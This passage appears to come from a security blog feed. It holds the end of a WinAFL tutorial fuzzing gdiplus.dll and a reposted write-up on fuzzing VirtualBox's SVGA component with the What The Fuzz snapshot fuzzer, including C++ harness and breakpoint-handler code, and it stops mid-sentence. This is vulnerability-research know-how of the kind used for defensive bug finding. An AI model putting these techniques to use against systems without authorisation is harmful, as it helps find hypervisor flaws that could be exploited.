class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">test_gdiplus.exe</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ntdll.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KERNEL32.DLjL</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">KERNELBASE.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">ucrtbase.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gdiplus.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">msvcrt.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">combase.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">VCRUNTIME140.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">RPCRT4.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">USER32.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">win32u.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">GDI32.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gdi32full.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">msvcp_win.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">IMM32.DLL</span><br><span class="hljs-attribute">iteration 0</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">uxtheme.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">msctf.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">oleaut32.dll</span><br><span class="hljs-attribute">Module loaded</span><span class="hljs-punctuation">:</span> <span class="hljs-string">sechost.dll</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 1</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 2</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 3</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 4</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 5</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 6</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 7</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 8</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">iteration 9</span><br><span class="hljs-attribute">Iteration finished normally</span><br><span class="hljs-attribute">Coverage map (hex)</span><span class="hljs-punctuation">: </span><br>00000000000000000000000000000000<br>00000000000000000000000000000000<br></code></pre></td></tr></table></figure><h2 id="6-用-Intel-PT-模式-fuzz"><a href="#6-用-Intel-PT-模式-fuzz" class="headerlink" title="6. 用 Intel PT 模式 fuzz"></a>6. 用 Intel PT 模式 fuzz</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">afl-fuzz.exe -i in -o out -P -t 20000 -- -coverage_module gdiplus.dll ^<br>-coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^<br>-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@<br></code></pre></td></tr></table></figure><p>用上面的命令调用 afl-fuzz，发现可以正常工作，界面如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">               WinAFL 1.16b based on AFL 2.43b (test_gdiplus.exe)<br><br>+- process timing -------------------------------------+- overall results ----+<br>|<span class="hljs-string">        run time : 0 days, 0 hrs, 0 min, 15 sec       </span>|<span class="hljs-string">  cycles done : 0     </span>|<br>|<span class="hljs-string">   last new path : 0 days, 0 hrs, 0 min, 1 sec        </span>|<span class="hljs-string">  total paths : 9     </span>|<br>|<span class="hljs-string"> last uniq crash : none seen yet                      </span>|<span class="hljs-string"> uniq crashes : 0     </span>|<br>|<span class="hljs-string">  last uniq hang : none seen yet                      </span>|<span class="hljs-string">   uniq hangs : 0     </span>|<br>+- cycle progress --------------------+- map coverage -+----------------------+<br>|<span class="hljs-string">  now processing : 0 (0.00%)         </span>|<span class="hljs-string">    map density : 1.50% / 3.67%        </span>|<br>|<span class="hljs-string"> paths timed out : 0 (0.00%)         </span>|<span class="hljs-string"> count coverage : 1.40 bits/tuple      </span>|<br>+- stage progress --------------------+ findings in depth --------------------+<br>|<span class="hljs-string">  now trying : havoc                 </span>|<span class="hljs-string"> favored paths : 1 (11.11%)            </span>|<br>|<span class="hljs-string"> stage execs : 2332/8192 (28.47%)    </span>|<span class="hljs-string">  new edges on : 5 (55.56%)            </span>|<br>|<span class="hljs-string"> total execs : 3350                  </span>|<span class="hljs-string"> total crashes : 0 (0 unique)          </span>|<br>|<span class="hljs-string">  exec speed : 221.4/sec             </span>|<span class="hljs-string">  total tmouts : 0 (0 unique)          </span>|<br>+- fuzzing strategy yields -----------+---------------+- path geometry -------+<br>|<span class="hljs-string">   bit flips : 0/48, 0/47, 1/45                      </span>|<span class="hljs-string">    levels : 2         </span>|<br>|<span class="hljs-string">  byte flips : 0/6, 0/5, 0/3                         </span>|<span class="hljs-string">   pending : 9         </span>|<br>|<span class="hljs-string"> arithmetics : 1/335, 0/75, 0/0                      </span>|<span class="hljs-string">  pend fav : 1         </span>|<br>|<span class="hljs-string">  known ints : 0/28, 1/168, 1/120                    </span>|<span class="hljs-string"> own finds : 8         </span>|<br>|<span class="hljs-string">  dictionary : 0/0, 0/0, 0/0                         </span>|<span class="hljs-string">  imported : n/a       </span>|<br>|<span class="hljs-string">       havoc : 0/0, 0/0                              </span>|<span class="hljs-string"> stability : 65.28%    </span>|<br>|<span class="hljs-string">        trim : 0.00%/1, 0.00%                        +-----------------------+</span><br><span class="hljs-string">+-----------------------------------------------------+   [cpu000001:  23%]</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="7-Winafl-的多核使用情况"><a href="#7-Winafl-的多核使用情况" class="headerlink" title="7. Winafl 的多核使用情况"></a>7. Winafl 的多核使用情况</h2><p>执行 Winafl 的 PT 模式，使用任务管理器 -&gt; 打开资源监视器 -&gt;  CPU 可以观察到只有一个 CPU core 跑满 100%</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/googleprojectzero/winafl/blob/master/README.md">https://github.com/googleprojectzero/winafl/blob/master/README.md</a><br><a href="https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md">https://github.com/googleprojectzero/winafl/blob/master/readme_dr.md</a><br><a href="https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md">https://github.com/googleprojectzero/winafl/blob/master/readme_pt.md</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>When Hypervisor Met Snapshot Fuzzing</title>
    <link href="/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/"/>
    <url>/cn/2022-07-21-When-Hypervisor-Met-Snapshot-Fuzzing/</url>
    
    <content type="html"><![CDATA[<p>source: <a href="https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html">https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html</a></p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1. Introduction"></a>1. Introduction</h1><p>Hypervisor was known as hard target to fuzz over several years. Even though, lots of prior pioneers( <a href="https://rezer0dai.github.io/biug-bounties/">Peter Hlavaty</a>, <a href="https://conference.hitb.org/hitbsecconf2021ams/materials/D2T2%20-%20Discovering%2010+%20Vulnerabilities%20in%20Virtualbox%20-%20Chen%20Nan.pdf">Chaitin Tech</a>, <a href="https://starlabs.sg/blog/2020/04-adventures-in-hypervisor-oracle-virtualbox-research/#coverage-guided-fuzzing">StarLabs</a>, <a href="https://github.com/SafeBreach-Labs/hAFL2">Peleg Hadar and Ophir Harpaz</a> and many others ) doing amazing work to overcome this limit and found interesting bugs.</p><p>But it is not an easy topic for some fresh newbie like me to starts from the bottom. I think manual code( or binary ) auditing and static analysis could be only considerable options if I start my research a few years ago without <strong>What The Fuzz</strong>.</p><p><a href="https://github.com/0vercl0k/wtf">What The Fuzz</a>( a.k.a WTF ) is a snapshot-based fuzzer targeting Windows Ring-3 and Ring-0 component. WTF’s snapshot is based on memory dump both kernel and user-land. Because of that, WTF can not emulate any functionality which requires anything not within in-memory and can not create new process or thread because memory dump limited on single process. But WTF support <a href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/bochscpu_backend.cc#L265">breakpoint Handler</a> which you can set breakpoint on <strong>any</strong> address within memory dump and if fuzz execution reaches that address, pre-defined breakpoint handler will be executed. Based on this, we can trying to overcome some limitation on WTF such as <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fshooks.cc">file access</a>.</p><p>I really love WTF’s flexibility and its potential, and I am going to show one of example usage of WTF on targeting Virtualbox to prove how awesome it is.</p><h1 id="2-Developing-Fuzz-Module"><a href="#2-Developing-Fuzz-Module" class="headerlink" title="2. Developing Fuzz Module"></a>2. Developing Fuzz Module</h1><p>First, you should define your own fuzz module for your target. There are few examples on github( <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">fuzzer_hevd.cc</a>, <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">fuzzer_tlv_server.cc</a> ) and blog post( <a href="https://blog.ret2.io/2021/07/21/wtf-snapshot-fuzzing/">ret2systems</a>, <a href="https://doar-e.github.io/blog/2021/07/15/building-a-new-snapshot-fuzzer-fuzzing-ida/">Doar-e</a> ). </p><p>My Target was Virtualbox’s <strong>SVGA</strong> component.</p><p>SVGA is something like “<a href="https://www.zerodayinitiative.com/blog/2021/1/6/mindshare-analysis-of-vmware-workstation-and-esxi-using-debug-symbols-from-flings">JavaScript of hypervisors</a>“. Because of its complex nature, many hypervisor bugs are oriented by SVGA. And that’s the reason why I choose it as a first target.</p><p>VirtualBox have a function called <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4505">vmsvgaR3FifoLoop</a>. It <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4757">waits</a> until guest submit new command data through GPA. So this is a good spot( or should I call it <a href="https://youtu.be/ZaOtY4i5w_U">source</a>? ) to take a snapshot.</p><p>I set a breakpoint on <code>vmsvgaR3FifoLoop+4E2</code> to take snapshot. It is same position as <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4783">here</a>, start of switch-case routine for <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Devices/Graphics/vmsvga_include/svga_reg.h#L152">SVGA</a> and <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163eabe8b7a7f14f29c88c13a458f38fe25e/src/VBox/Additions/3D/mesa/mesa-17.3.9/src/gallium/drivers/svga/include/svga3d_cmd.h#L56">SVGA3D</a> command.</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah1.png" alt="blahblah1"></p><p>After creating snapshot, I had to decide make it <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_tlv_server.cc">run multiple times in single execution</a> or <a href="https://github.com/0vercl0k/wtf/blob/main/src/wtf/fuzzer_hevd.cc">not</a>. Because SVGA is consist of various commands like define, update, delete something…, I thought fuzz campaign must handle multiple SVGA commands during single round.</p><p>First, I had to define structure to contains multiple testcases. Luckily, <a href="https://twitter.com/0vercl0k">0vercl0k</a> already write <a href="https://github.com/0vercl0k/wtf/blob/4a9bf55/src/wtf/fuzzer_tlv_server.cc#L24-L75">nice example</a> to doing that. So I did same thing as below.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SVGA_CMD_BODY_MAX 0xA000</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> SvgaCmdList[] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">19</span>, <span class="hljs-number">22</span>, <span class="hljs-number">25</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-number">33</span>, <span class="hljs-number">34</span>, <span class="hljs-number">35</span>, <span class="hljs-number">36</span>, <span class="hljs-number">37</span>, <span class="hljs-number">38</span>, <span class="hljs-number">39</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">42</span>, <span class="hljs-number">1040</span>, <span class="hljs-number">1041</span>, <span class="hljs-number">1042</span>, <span class="hljs-number">1043</span>, <span class="hljs-number">1044</span>, <span class="hljs-number">1046</span>, <span class="hljs-number">1047</span>, <span class="hljs-number">1048</span>, <span class="hljs-number">1049</span>, <span class="hljs-number">1050</span>, <span class="hljs-number">1051</span>, <span class="hljs-number">1052</span>, <span class="hljs-number">1053</span>, <span class="hljs-number">1054</span>, <span class="hljs-number">1055</span>, <span class="hljs-number">1056</span>, <span class="hljs-number">1057</span>, <span class="hljs-number">1058</span>, <span class="hljs-number">1059</span>, <span class="hljs-number">1060</span>, <span class="hljs-number">1061</span>, <span class="hljs-number">1062</span>, <span class="hljs-number">1063</span>, <span class="hljs-number">1064</span>, <span class="hljs-number">1065</span>, <span class="hljs-number">1066</span>, <span class="hljs-number">1067</span>, <span class="hljs-number">1068</span>, <span class="hljs-number">1069</span>, <span class="hljs-number">1070</span>, <span class="hljs-number">1071</span>, <span class="hljs-number">1072</span>, <span class="hljs-number">1073</span>, <span class="hljs-number">1074</span>, <span class="hljs-number">1075</span>, <span class="hljs-number">1076</span>, <span class="hljs-number">1077</span>, <span class="hljs-number">1078</span>, <span class="hljs-number">1079</span>, <span class="hljs-number">1080</span>, <span class="hljs-number">1081</span>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> SvgaCmdListLen = <span class="hljs-number">58</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SvgaCmd_t</span> &#123;<br>  <span class="hljs-type">uint32_t</span> SvgaCmdCode;<br>  std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; SvgaBody;<br>  <span class="hljs-built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmd_t, SvgaCmdCode, SvgaBody);<br>&#125;;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">SvgaCmds_t</span> &#123;<br>  std::vector&lt;SvgaCmd_t&gt; SvgaCmds;<br>  <span class="hljs-built_in">NLOHMANN_DEFINE_TYPE_INTRUSIVE</span>(SvgaCmds_t, SvgaCmds);<br>&#125;;<br><br><span class="hljs-keyword">struct</span> &#123;<br>  std::deque&lt;SvgaCmd_t&gt; SvgaCmds;<br>  CpuState_t Context;<br>  <span class="hljs-type">uint8_t</span> SvgaCmdBody[SVGA_CMD_BODY_MAX];<br>  <span class="hljs-type">uint32_t</span> SvgaCmdBodySize;<br><br>  <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RestoreGprs</span><span class="hljs-params">(Backend_t *B)</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;C = Context;<br>    B-&gt;<span class="hljs-built_in">Rsp</span>(C.Rsp);<br>    B-&gt;<span class="hljs-built_in">Rip</span>(C.Rip);<br>    B-&gt;<span class="hljs-built_in">Rax</span>(C.Rax);<br>    B-&gt;<span class="hljs-built_in">Rbx</span>(C.Rbx);<br>    B-&gt;<span class="hljs-built_in">Rcx</span>(C.Rcx);<br>    B-&gt;<span class="hljs-built_in">Rdx</span>(C.Rdx);<br>    B-&gt;<span class="hljs-built_in">Rsi</span>(C.Rsi);<br>    B-&gt;<span class="hljs-built_in">Rdi</span>(C.Rdi);<br>    B-&gt;<span class="hljs-built_in">R8</span>(C.R8);<br>    B-&gt;<span class="hljs-built_in">R9</span>(C.R9);<br>    B-&gt;<span class="hljs-built_in">R10</span>(C.R10);<br>    B-&gt;<span class="hljs-built_in">R11</span>(C.R11);<br>    B-&gt;<span class="hljs-built_in">R12</span>(C.R12);<br>    B-&gt;<span class="hljs-built_in">R13</span>(C.R13);<br>    B-&gt;<span class="hljs-built_in">R14</span>(C.R14);<br>    B-&gt;<span class="hljs-built_in">R15</span>(C.R15);<br>  &#125;<br>&#125; GlobalState;<br><br><span class="hljs-function">SvgaCmds_t <span class="hljs-title">Deserialize</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Buffer, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> BufferSize)</span> </span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;Root = json::json::<span class="hljs-built_in">parse</span>(Buffer, Buffer + BufferSize);<br>  <span class="hljs-keyword">return</span> Root.<span class="hljs-built_in">get</span>&lt;SvgaCmds_t&gt;();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">InsertTestcase</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span> *Buffer, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> BufferSize)</span> </span>&#123;<br>  GlobalState.SvgaCmds.<span class="hljs-built_in">clear</span>();<br><br>  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;Root = <span class="hljs-built_in">Deserialize</span>(Buffer, BufferSize);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> SvgaCmd : Root.SvgaCmds) &#123;<br>    GlobalState.SvgaCmds.<span class="hljs-built_in">emplace_back</span>(std::<span class="hljs-built_in">move</span>(SvgaCmd));<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>It is almost identical as example.</p><p>Next question was, how can I insert data into snapshot? I had to find a insertion point and proper memory address. Luckily( again ), VirtualBox using a function called <a href="https://github.com/mdaniel/virtualbox-org-svn-vbox-trunk/blob/8fe9163/src/VBox/Devices/Graphics/DevVGA-SVGA.cpp#L4183">vmsvgaR3FifoGetCmdPayload</a> to receive command data from guest to host. I define a breakpoint handler in <code>Init()</code> callback function as below.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//</span><br><span class="hljs-comment">// unsigned __int8 *__fastcall vmsvgaR3FifoGetCmdPayload(</span><br><span class="hljs-comment">//       unsigned int cbPayloadReq,</span><br><span class="hljs-comment">//       volatile unsigned int *pFIFO,</span><br><span class="hljs-comment">//       unsigned int offCurrentCmd,</span><br><span class="hljs-comment">//       unsigned int offFifoMin,</span><br><span class="hljs-comment">//       unsigned int offFifoMax,</span><br><span class="hljs-comment">//       unsigned __int8 *pbBounceBuf,</span><br><span class="hljs-comment">//       unsigned int *pcbAlreadyRead,</span><br><span class="hljs-comment">//       PDMTHREAD *pThread,</span><br><span class="hljs-comment">//       VGAState *pThis,</span><br><span class="hljs-comment">//       VMSVGAR3STATE *pSVGAState,</span><br><span class="hljs-comment">//       PDMDEVINSR3 *pDevIns)</span><br><span class="hljs-comment">//</span><br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoGetCmdPayload&quot;</span>, [](Backend_t *Backend) &#123;<br>  <span class="hljs-type">uint32_t</span> cbPayloadReq = Backend-&gt;<span class="hljs-built_in">GetArg</span>(<span class="hljs-number">0</span>);<br>  Gva_t pbBounceBuf_gva = Backend-&gt;<span class="hljs-built_in">GetArgGva</span>(<span class="hljs-number">5</span>);<br>  Gva_t pcbAlreadyRead_gva = Backend-&gt;<span class="hljs-built_in">GetArgGva</span>(<span class="hljs-number">6</span>);<br><br>  <span class="hljs-keyword">if</span>(cbPayloadReq &gt; GlobalState.SvgaCmdBodySize) &#123;<br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;cbpayloadReq(&#123;:#x&#125;) &gt; SvgaCmdBodySize(&#123;:#x&#125;), restore context and goto next round\n&quot;</span>, cbPayloadReq, GlobalState.SvgaCmdBodySize);<br>    <span class="hljs-keyword">return</span> GlobalState.<span class="hljs-built_in">RestoreGprs</span>(Backend);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(cbPayloadReq &gt; u32PbBounceBufMaxSize) &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">uint64_t</span> RetAddr = Backend-&gt;<span class="hljs-built_in">VirtRead8</span>(<span class="hljs-built_in">Gva_t</span>(Backend-&gt;<span class="hljs-built_in">Rsp</span>()));<br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;check this, RetAddr = &#123;:#x&#125;\n&quot;</span>, RetAddr);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!Backend-&gt;<span class="hljs-built_in">VirtWriteDirty</span>(pbBounceBuf_gva, GlobalState.SvgaCmdBody, cbPayloadReq)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to write pbBounceBuf, pbBounceBuf = &#123;:#x&#125;, cbPayloadReq = &#123;:#x&#125;, SvgaCmdBodySize = &#123;:#x&#125;\n&quot;</span>,<br>                pbBounceBuf_gva.<span class="hljs-built_in">U64</span>(), cbPayloadReq, GlobalState.SvgaCmdBodySize);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!Backend-&gt;<span class="hljs-built_in">VirtWriteStructDirty</span>(pcbAlreadyRead_gva, &amp;cbPayloadReq)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Faile to write pcbAlreadyRead, pcbAlreadyRead = &#123;:#x&#125;\n&quot;</span>, pcbAlreadyRead_gva.<span class="hljs-built_in">U64</span>());<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(pbBounceBuf_gva.<span class="hljs-built_in">U64</span>());<br><br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on VBoxDD!vmsvgaR3FifoGetCmdPayload\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>I also had to define end point of execution. After some reversing, I found two spots and using it as end point.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> Gva_t SvgaLoopEnd = <span class="hljs-built_in">Gva_t</span>(g_Dbg.<span class="hljs-built_in">GetSymbol</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="hljs-number">0x24AB</span>);<br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(SvgaLoopEnd, [](Backend_t *Backend) &#123;<br>  <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;loop end reached, restore context\n&quot;</span>);<br>  GlobalState.<span class="hljs-built_in">RestoreGprs</span>(g_Backend);<br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on SvgaLoopEnd\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-type">const</span> Gva_t SvgLoopEnd2 = <span class="hljs-built_in">Gva_t</span>(g_Dbg.<span class="hljs-built_in">GetSymbol</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="hljs-number">0x24B2</span>);<br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(SvgLoopEnd2, [](Backend_t *Backend) &#123;<br>  <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;loop end2 reached, restore context\n&quot;</span>);<br>  GlobalState.<span class="hljs-built_in">RestoreGprs</span>(g_Backend);<br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on SvgLoopEnd2\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>As I said above, I create a snapshot on 